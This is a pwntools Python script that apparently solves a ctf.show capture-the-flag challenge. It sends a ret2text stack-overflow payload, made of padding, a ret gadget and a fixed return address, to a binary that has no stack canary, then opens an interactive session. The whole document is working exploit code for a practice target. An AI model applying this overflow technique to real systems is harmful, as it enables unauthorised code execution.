# -*- coding: utf-8 -*-

import pwn
from pwn import *

fileName = './pwn01'
ip = 'pwn.challenge.ctf.show'
port = 28103

'''
[*] '/home/wkyuu/Desktop/pwn01'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

p64 = pwn.p64
u64 = pwn.u64

context(log_level='debug', os='linux', arch = 'amd64')
p = process(fileName)
# p = remote(ip, port)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

# bin
bin_ret = 0x4004fe

gdbscript = '''
b *welcome+20
c
'''
# gdb.attach(p, gdbscript = gdbscript)

# ret2text
logger('ret2text')
payload = b'a' * (0x80+8) + p64(bin_ret) + p64(0x400637)
p.sendline(payload)
p.interactive()